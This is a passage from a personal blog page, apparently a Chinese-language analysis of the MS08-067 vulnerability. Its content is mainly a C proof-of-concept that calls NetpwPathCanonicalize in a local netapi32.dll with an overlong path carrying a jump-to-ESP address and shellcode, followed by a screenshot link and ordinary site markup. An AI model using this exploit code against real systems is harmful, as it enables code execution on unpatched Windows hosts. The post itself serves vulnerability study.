class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span>\</span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span>\</span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span>\</span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span>\</span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span>\</span><br><span class="line"><span class="string">"\x53\x68\x74\x65\x73\x74\x68\x6D\x69\x78\x69\x8B\xC4\x53\x50\x50"</span>\</span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span>\</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>; </span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">".\\netapi32.dll"</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Fail to load library!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">"NetpwPathCanonicalize"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">        FreeLibrary(handle);</span><br><span class="line">        wprintf(<span class="string">L"Fail to get api address!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L"\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"</span>);</span><br><span class="line">    wcscat(path, (<span class="keyword">wchar_t</span>  *)JMP_ESP);</span><br><span class="line">    wcscat(path, (<span class="keyword">wchar_t</span>  *)SHELL_CODE);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L"BEFORE: %s\n"</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L"AFTER : %s\n"</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L"RETVAL: %s(0x%X)\n\n"</span>, retval?<span class="string">L"FAIL"</span>:<span class="string">L"SUCCESS"</span>, retval);</span><br><span class="line"> </span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/26/ms08-067%E5%88%86%E6%9E%90/ms08067success.JPG" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/21/2020-4-21/" rel="next" title="一道笔试题">
+                <i class="fa fa-chevron-left"></i> 一道笔试题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/me.jpg"
+                alt="Ivoripuion" />
+            
+              <p class="site-author-name" itemprop="name">Ivoripuion</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简要分析"><span class="nav-number">1.</span> <span class="nav-text">简要分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ivoripuion</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":225,"height":450},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
